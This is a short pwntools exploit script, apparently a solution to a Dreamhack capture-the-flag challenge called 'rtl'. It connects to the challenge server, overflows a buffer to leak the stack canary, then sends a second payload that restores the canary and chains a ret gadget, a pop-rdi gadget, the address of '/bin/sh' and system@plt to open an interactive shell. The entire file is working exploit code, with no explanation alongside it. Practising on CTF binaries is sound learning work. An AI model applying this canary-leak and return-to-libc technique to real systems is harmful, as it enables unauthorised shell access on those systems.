from pwn import *

p = remote("host3.dreamhack.games",21371)
e = ELF('./rtl')

system = e.plt["system"]
poprdiret = 0x0000000000400853
binsh = 0x400874
#ret = 0x00000000004007e7
ret = 0x0000000000400285


payload = b''
payload += b'a'*57
p.sendafter(":",payload)
p.recvuntil(payload)
canary = b'\x00'+p.recv(7)
print(canary)

payload = b''
payload += b'a'*56
payload += canary
payload += b'b'*8
payload += p64(ret)
payload += p64(poprdiret)
payload += p64(binsh)
payload += p64(system)

p.sendafter(":",payload)

p.interactive()

